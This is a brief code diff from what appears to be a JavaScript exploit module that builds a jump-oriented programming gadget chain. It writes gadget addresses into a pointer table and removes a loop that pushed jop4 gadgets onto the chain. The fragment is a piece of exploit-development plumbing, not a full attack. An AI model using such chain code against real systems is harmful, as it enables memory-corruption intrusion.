@@ -253,9 +253,7 @@ export function init(Chain) {
     rax_ptrs.write64(0x70, get_gadget(gadgets, jop2));
     rax_ptrs.write64(0x30, get_gadget(gadgets, jop3));
    // rax_ptrs.write64(0x40, get_gadget(gadgets, jop4));
-    for (const gadget of jop4) {
-        chain.push_gadget(gadget);
-    }
+  
    
     rax_ptrs.write64(0, get_gadget(gadgets, jop5));
 
